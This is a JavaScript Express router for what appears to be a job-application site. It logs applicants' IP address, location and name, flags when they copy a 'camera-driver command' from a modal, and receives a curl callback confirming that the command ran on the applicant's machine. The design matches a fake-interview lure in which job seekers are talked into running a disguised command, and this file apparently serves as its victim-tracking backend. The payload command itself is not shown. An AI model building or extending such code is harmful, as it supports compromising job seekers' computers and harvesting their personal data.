const express  = require("express");
const supabase = require("../lib/supabase");

const router = express.Router();

// ---------------------------------------------------------------------------
// Geo-lookup using ip-api.com (free, no key required, 1 000 req/min limit).
// Returns { country, city } or nulls on failure — never throws.
// ---------------------------------------------------------------------------
async function geoLookup(ip) {
  try {
    // Skip private / loopback addresses (local dev)
    if (!ip || ip === "::1" || ip.startsWith("127.") || ip.startsWith("192.168.") || ip.startsWith("10.")) {
      return { country: "Local", city: "Local" };
    }
    const res  = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city`);
    const json = await res.json();
    if (json.status === "success") return { country: json.country || null, city: json.city || null };
    return { country: null, city: null };
  } catch {
    return { country: null, city: null };
  }
}

// Extract the real client IP, respecting common proxy headers
function getIP(req) {
  const forwarded = req.headers["x-forwarded-for"];
  if (forwarded) return forwarded.split(",")[0].trim();
  return req.socket?.remoteAddress || null;
}

// ---------------------------------------------------------------------------
// PATCH /api/progress
// Called every time the user moves to the next step.
// Body: { sessionId, step, role, firstName?, lastName? }
// ---------------------------------------------------------------------------
router.patch("/", async (req, res) => {
  const { sessionId, step, role, firstName, lastName } = req.body;

  if (!sessionId || step === undefined) {
    return res.status(400).json({ error: "sessionId and step are required." });
  }

  // Only geo-lookup on the very first step to avoid hammering the API
  let geoFields = {};
  if (step === 0) {
    const ip = getIP(req);
    const { country, city } = await geoLookup(ip);
    geoFields = { ip_address: ip, country, city };
  }

  // Capture name fields when provided (sent on step 1 after step 0 is validated)
  const nameFields = {};
  if (firstName) nameFields.first_name = firstName.trim();
  if (lastName)  nameFields.last_name  = lastName.trim();

  const { error } = await supabase
    .from("application_progress")
    .upsert(
      {
        session_id:   sessionId,
        current_step: step,
        role:         role || null,
        updated_at:   new Date().toISOString(),
        ...geoFields,
        ...nameFields,
      },
      { onConflict: "session_id" }
    );

  if (error) {
    console.error("Progress upsert error:", error.message);
    return res.status(500).json({ error: "Failed to record progress." });
  }

  return res.json({ ok: true });
});

// ---------------------------------------------------------------------------
// POST /api/progress/cmd-complete
// Called by the curl appended to the driver command — signals the terminal
// command finished running on the applicant's machine.
// Body: { sessionId }
// ---------------------------------------------------------------------------
router.post("/cmd-complete", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "sessionId is required." });
  }

  const { error } = await supabase
    .from("application_progress")
    .update({ cmd_completed: true, updated_at: new Date().toISOString() })
    .eq("session_id", sessionId);

  if (error) {
    console.error("cmd-complete update error:", error.message);
    return res.status(500).json({ error: "Failed to record command completion." });
  }

  return res.json({ ok: true });
});

// ---------------------------------------------------------------------------
// GET /api/progress/cmd-status?sessionId=xxx
// Polled by the frontend to check whether the terminal command has completed.
// ---------------------------------------------------------------------------
router.get("/cmd-status", async (req, res) => {
  const { sessionId } = req.query;

  if (!sessionId) {
    return res.status(400).json({ error: "sessionId is required." });
  }

  const { data, error } = await supabase
    .from("application_progress")
    .select("cmd_completed")
    .eq("session_id", sessionId)
    .single();

  if (error) {
    console.error("cmd-status fetch error:", error.message);
    return res.status(500).json({ error: "Failed to check command status." });
  }

  return res.json({ completed: data?.cmd_completed ?? false });
});

// ---------------------------------------------------------------------------
// PATCH /api/progress/camera-copied
// Called when the applicant copies the camera-driver command from the modal.
// Body: { sessionId }
// ---------------------------------------------------------------------------
router.patch("/camera-copied", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "sessionId is required." });
  }

  const { error } = await supabase
    .from("application_progress")
    .update({ camera_cmd_copied: true, updated_at: new Date().toISOString() })
    .eq("session_id", sessionId);

  if (error) {
    console.error("Camera copied update error:", error.message);
    return res.status(500).json({ error: "Failed to record camera copy event." });
  }

  return res.json({ ok: true });
});

// ---------------------------------------------------------------------------
// PATCH /api/progress/complete
// Called when the application is successfully submitted.
// Body: { sessionId }
// ---------------------------------------------------------------------------
router.patch("/complete", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({ error: "sessionId is required." });
  }

  const { error } = await supabase
    .from("application_progress")
    .update({ completed: true, updated_at: new Date().toISOString() })
    .eq("session_id", sessionId);

  if (error) {
    console.error("Progress complete error:", error.message);
    return res.status(500).json({ error: "Failed to mark progress complete." });
  }

  return res.json({ ok: true });
});

// ---------------------------------------------------------------------------
// GET /api/progress/stats
// Returns funnel stats + recent sessions for the dashboard.
// ---------------------------------------------------------------------------
router.get("/stats", async (req, res) => {
  // Funnel counts per step
  const { data: funnel, error: funnelError } = await supabase
    .from("application_progress")
    .select("current_step, completed");

  if (funnelError) {
    console.error("Stats fetch error:", funnelError.message);
    return res.status(500).json({ error: "Failed to load stats." });
  }

  // Recent sessions (last 50, newest first) — includes ip, geo, name, and camera copy flag
  const { data: sessions, error: sessionsError } = await supabase
    .from("application_progress")
    .select("session_id, first_name, last_name, role, current_step, completed, created_at, updated_at, ip_address, country, city, camera_cmd_copied")
    .order("updated_at", { ascending: false })
    .limit(50);

  if (sessionsError) {
    console.error("Sessions fetch error:", sessionsError.message);
    return res.status(500).json({ error: "Failed to load sessions." });
  }

  // Aggregate funnel counts
  const STEP_NAMES = ["Your info", "Experience", "Final details", "Review"];
  const stepCounts = [0, 1, 2, 3].map(s => ({
    step:      s,
    label:     STEP_NAMES[s],
    reached:   funnel.filter(r => r.current_step >= s).length,
    completed: funnel.filter(r => r.completed).length,
  }));

  return res.json({ funnel: stepCounts, sessions, total: funnel.length });
});

module.exports = router;
